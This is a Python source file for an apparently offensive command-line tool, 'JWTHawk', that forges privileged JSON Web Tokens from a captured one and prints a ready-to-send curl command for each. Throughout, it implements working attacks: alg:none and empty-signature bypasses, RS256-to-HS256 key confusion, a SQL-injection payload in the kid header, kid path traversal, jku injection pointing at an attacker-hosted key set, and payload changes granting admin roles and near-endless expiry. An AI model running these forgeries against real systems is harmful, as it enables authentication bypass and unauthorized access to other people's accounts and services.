"""JWTHawk: mint privileged JWT variants from a captured token.

Each attack prints a diff (original header/payload vs mutated) and a copy-paste
curl that replays a captured request with the forged token substituted in.
"""

import argparse
import base64
import hashlib
import hmac
import json
import os
import sys
from dataclasses import dataclass


def b64u_encode(b: bytes) -> str:
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode("ascii")


def b64u_decode(s: str) -> bytes:
    pad = "=" * (-len(s) % 4)
    return base64.urlsafe_b64decode(s + pad)


@dataclass
class Token:
    header: dict
    payload: dict
    signature: bytes
    raw: str

    @classmethod
    def parse(cls, raw: str) -> "Token":
        parts = raw.split(".")
        if len(parts) != 3:
            raise ValueError(f"expected three dot-separated segments, got {len(parts)}")
        try:
            h = json.loads(b64u_decode(parts[0]))
            p = json.loads(b64u_decode(parts[1]))
            s = b64u_decode(parts[2])
        except (ValueError, json.JSONDecodeError) as exc:
            raise ValueError(f"malformed token: {exc}") from exc
        return cls(h, p, s, raw)

    def emit(self, header: dict, payload: dict, sig: bytes) -> str:
        h = b64u_encode(json.dumps(header, separators=(",", ":")).encode())
        p = b64u_encode(json.dumps(payload, separators=(",", ":")).encode())
        s = b64u_encode(sig)
        return f"{h}.{p}.{s}"


@dataclass
class Attack:
    name: str
    why: str
    new_header: dict
    new_payload: dict
    new_sig: bytes
    notes: list[str]


def attack_alg_none(t: Token) -> Attack:
    h = {**t.header, "alg": "none"}
    return Attack(
        name="alg:none",
        why="server treats `none` as a valid algorithm and skips signature verification",
        new_header=h,
        new_payload=t.payload,
        new_sig=b"",
        notes=["signature stripped to empty string"],
    )


def attack_empty_sig(t: Token) -> Attack:
    return Attack(
        name="empty signature",
        why="some libraries accept an empty `b64()` signature when `alg` is unchanged",
        new_header=t.header,
        new_payload=t.payload,
        new_sig=b"",
        notes=["alg untouched, signature emptied"],
    )


def attack_alg_confusion(t: Token, pubkey_pem: str | None) -> Attack:
    h = {**t.header, "alg": "HS256"}
    new_payload = t.payload
    notes: list[str] = []
    if pubkey_pem:
        signing_bytes = pubkey_pem.encode()
        sig = hmac.new(signing_bytes, _signing_input(h, new_payload), hashlib.sha256).digest()
        notes.append("HMAC-SHA256 over the literal RSA public key bytes")
    else:
        sig = hmac.new(b"", _signing_input(h, new_payload), hashlib.sha256).digest()
        notes.append("WARN: --pubkey not supplied; signed with empty key as a placeholder")
    return Attack(
        name="alg confusion (RS256 → HS256)",
        why="server uses the RSA public key as an HMAC secret when alg is downgraded to HS256",
        new_header=h,
        new_payload=new_payload,
        new_sig=sig,
        notes=notes,
    )


def attack_kid_sqli(t: Token) -> Attack:
    h = {**t.header, "kid": "x' UNION SELECT 'AAAAAAAAAAAAAAAAAAAAAAAAAAA='-- "}
    sig = hmac.new(b"AAAAAAAAAAAAAAAAAAAAAAAAAAA=", _signing_input(h, t.payload), hashlib.sha256).digest()
    return Attack(
        name="kid SQL injection",
        why="server resolves `kid` via SQL: UNION returns an attacker-controlled key the token is then signed with",
        new_header=h,
        new_payload=t.payload,
        new_sig=sig,
        notes=["kid is a UNION SELECT returning the constant 'AAAAAAAAAAAAAAAAAAAAAAAAAAA='", "token signed with that constant via HS256"],
    )


def attack_kid_path_traversal(t: Token) -> Attack:
    h = {**t.header, "kid": "../../../../../../dev/null"}
    sig = hmac.new(b"", _signing_input(h, t.payload), hashlib.sha256).digest()
    return Attack(
        name="kid path traversal",
        why="server reads the key file from disk via `kid`; pointing at /dev/null yields an empty key",
        new_header=h,
        new_payload=t.payload,
        new_sig=sig,
        notes=["kid points at /dev/null; HMAC signed with empty key"],
    )


def attack_jku_injection(t: Token, attacker_jwks_url: str) -> Attack:
    h = {**t.header, "jku": attacker_jwks_url, "alg": "RS256"}
    return Attack(
        name="jku injection",
        why="server fetches the JWKS from the URL in `jku` — point it at an attacker host serving the matching public key",
        new_header=h,
        new_payload=t.payload,
        new_sig=b"<sign-with-your-private-key>",
        notes=[
            f"jku set to {attacker_jwks_url}",
            "host an RSA JWKS at that URL; sign the token with your matching private key (openssl genrsa)",
            "signature placeholder above is intentional — replace before sending",
        ],
    )


def attack_role_escalation(t: Token) -> Attack:
    p = dict(t.payload)
    changes: list[str] = []
    for k, v in (("role", "admin"), ("is_admin", True), ("is_staff", True), ("scope", "admin")):
        if k in p and p[k] != v:
            changes.append(f"set {k}={v} (was {p[k]!r})")
            p[k] = v
        elif k not in p:
            p[k] = v
            changes.append(f"added {k}={v}")
    sig = t.signature  # leave original signature; chains with alg:none / kid attack
    return Attack(
        name="role escalation (payload mutation)",
        why="payload-only mutation that pairs with any signature-bypass attack above",
        new_header=t.header,
        new_payload=p,
        new_sig=sig,
        notes=changes,
    )


def attack_exp_extension(t: Token) -> Attack:
    p = {**t.payload, "exp": 9999999999}
    return Attack(
        name="exp extension",
        why="extends token validity past sane bounds; pairs with sig-bypass attacks",
        new_header=t.header,
        new_payload=p,
        new_sig=t.signature,
        notes=[f"exp set to 9999999999 (was {t.payload.get('exp', '<absent>')})"],
    )


def _signing_input(header: dict, payload: dict) -> bytes:
    return f"{b64u_encode(json.dumps(header, separators=(',', ':')).encode())}.{b64u_encode(json.dumps(payload, separators=(',', ':')).encode())}".encode()


def _ansi():
    if os.environ.get("NO_COLOR") or not sys.stdout.isatty():
        return {"r": "", "g": "", "y": "", "dim": "", "b": "", "rst": ""}
    return {"r": "\033[31m", "g": "\033[32m", "y": "\033[33m", "dim": "\033[2m", "b": "\033[1m", "rst": "\033[0m"}


def diff_dict(orig: dict, mutated: dict) -> list[str]:
    """Return a list of `-` / `+` / ` ` prefixed lines representing the dict diff."""
    out: list[str] = []
    keys = sorted(set(orig) | set(mutated))
    for k in keys:
        ov = orig.get(k, "<absent>")
        nv = mutated.get(k, "<absent>")
        if ov == nv:
            out.append(f"  {k}: {json.dumps(ov)}")
        elif k in orig and k not in mutated:
            out.append(f"- {k}: {json.dumps(ov)}")
        elif k not in orig and k in mutated:
            out.append(f"+ {k}: {json.dumps(nv)}")
        else:
            out.append(f"- {k}: {json.dumps(ov)}")
            out.append(f"+ {k}: {json.dumps(nv)}")
    return out


def render_attack(t: Token, atk: Attack, target_curl: str | None) -> None:
    c = _ansi()
    new_token = t.emit(atk.new_header, atk.new_payload, atk.new_sig) if not isinstance(atk.new_sig, str) else "<placeholder, sign manually>"
    print()
    print(f"{c['b']}attack:{c['rst']} {atk.name}")
    print(f"{c['dim']}why:    {atk.why}{c['rst']}")
    print()
    print(f"{c['dim']}--- header (original){c['rst']}")
    print(f"{c['dim']}+++ header (mutated){c['rst']}")
    for line in diff_dict(t.header, atk.new_header):
        if line.startswith("-"):
            print(f"{c['r']}{line}{c['rst']}")
        elif line.startswith("+"):
            print(f"{c['g']}{line}{c['rst']}")
        else:
            print(f"{c['dim']}{line}{c['rst']}")
    print()
    print(f"{c['dim']}--- payload (original){c['rst']}")
    print(f"{c['dim']}+++ payload (mutated){c['rst']}")
    for line in diff_dict(t.payload, atk.new_payload):
        if line.startswith("-"):
            print(f"{c['r']}{line}{c['rst']}")
        elif line.startswith("+"):
            print(f"{c['g']}{line}{c['rst']}")
        else:
            print(f"{c['dim']}{line}{c['rst']}")
    if atk.notes:
        print()
        for n in atk.notes:
            print(f"  {c['y']}note:{c['rst']} {n}")
    print()
    print(f"  {c['b']}token:{c['rst']} {new_token}")
    if target_curl:
        substituted = target_curl.replace("{TOKEN}", new_token)
        print(f"  {c['b']}curl:{c['rst']}  {substituted}")
    print(f"{c['dim']}{'·' * 70}{c['rst']}")


def run(args: argparse.Namespace) -> int:
    c = _ansi()
    try:
        t = Token.parse(args.token)
    except ValueError as exc:
        print(f"error: {exc}", file=sys.stderr)
        return 1

    pubkey = None
    if args.pubkey:
        try:
            pubkey = open(args.pubkey).read()
        except OSError as exc:
            print(f"error: cannot read --pubkey: {exc}", file=sys.stderr)
            return 1

    print(f"{c['b']}JWTHawk{c['rst']}  {len(args.token)}-byte token, {t.header.get('alg', '<no alg>')} baseline")
    print(f"  baseline header  {json.dumps(t.header)}")
    print(f"  baseline payload {json.dumps(t.payload)}")
    print(f"  signature        {len(t.signature)} bytes ({base64.b16encode(t.signature[:8]).decode()}...)")
    if args.target_curl:
        print(f"  target curl      {args.target_curl[:80]}{'...' if len(args.target_curl) > 80 else ''}")
    print(f"{c['dim']}{'·' * 70}{c['rst']}")

    attacks = [
        attack_alg_none(t),
        attack_empty_sig(t),
        attack_alg_confusion(t, pubkey),
        attack_kid_sqli(t),
        attack_kid_path_traversal(t),
        attack_jku_injection(t, args.jku_url),
        attack_role_escalation(t),
        attack_exp_extension(t),
    ]
    for a in attacks:
        render_attack(t, a, args.target_curl)
    return 0


def main(argv: list[str] | None = None) -> int:
    p = argparse.ArgumentParser(
        prog="jwthawk",
        description="Mint privileged JWT variants from a captured token; emit a forged curl per attack.",
    )
    p.add_argument("--token", required=True, help="the captured JWT to attack")
    p.add_argument("--target-curl", help="curl template containing {TOKEN}; tool prints substituted variant per attack")
    p.add_argument("--pubkey", help="path to the RSA public key PEM (required for the surgical alg-confusion attack)")
    p.add_argument("--jku-url", default="https://attacker.example/.well-known/jwks.json", help="attacker-controlled JWKS URL for the jku-injection attack")
    args = p.parse_args(argv)
    return run(args)


if __name__ == "__main__":
    sys.exit(main())
